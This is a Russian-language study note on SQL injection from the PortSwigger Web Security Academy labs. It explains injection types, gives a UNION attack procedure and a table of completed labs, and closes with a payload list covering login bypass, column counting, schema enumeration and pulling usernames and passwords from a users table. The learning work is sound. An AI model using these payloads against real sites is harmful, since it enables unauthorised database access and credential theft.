# SQL Injection

**Платформа:** PortSwigger Web Security Academy  
**Статус:** В процессе

## Что такое SQL injection

SQL injection — уязвимость при которой пользовательский ввод попадает в SQL-запрос без проверки. Атакующий может изменить логику запроса и получить доступ к данным базы которые не должны быть доступны.

## Виды которые изучил

- **Error-based** — сервер возвращает ошибку с информацией о базе данных
- **UNION-based** — добавляем свой SELECT к исходному запросу и вытаскиваем данные
- **Blind** — сервер не показывает ошибки, определяем результат по поведению (время ответа, True/False)

## Алгоритм UNION атаки

1. Определить количество столбцов через `ORDER BY 1--`, `ORDER BY 2--` и т.д. до ошибки
2. Найти столбцы с текстовым типом через `UNION SELECT NULL,'a',NULL--`
3. Вытащить структуру базы через `information_schema.tables` и `information_schema.columns`
4. Получить нужные данные: `UNION SELECT username,password FROM users--`

## Лабораторные

| Лаба | Уровень | Статус |
|------|---------|--------|
| SQL injection vulnerability in WHERE clause | Apprentice | ✅ |
| SQL injection vulnerability allowing login bypass | Apprentice | ✅ |
| UNION attack, determining the number of columns | Practitioner | ✅ |
| UNION attack, finding a column containing text | Practitioner | ✅ |
| UNION attack, retrieving data from other tables | Practitioner | ✅ |
| UNION attack, retrieving multiple values in a single column | Practitioner | ✅ |

## Полезные payload'ы

```sql
-- Проверка наличия уязвимости
'
' OR 1=1--

-- Определение количества столбцов
' ORDER BY 1--
' ORDER BY 2--

-- Поиск текстовых столбцов
' UNION SELECT NULL,'a'--
' UNION SELECT NULL,'a',NULL--

-- Получение таблиц
' UNION SELECT table_name,NULL FROM information_schema.tables--

-- Получение столбцов
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--

-- Получение данных
' UNION SELECT username,password FROM users--
```
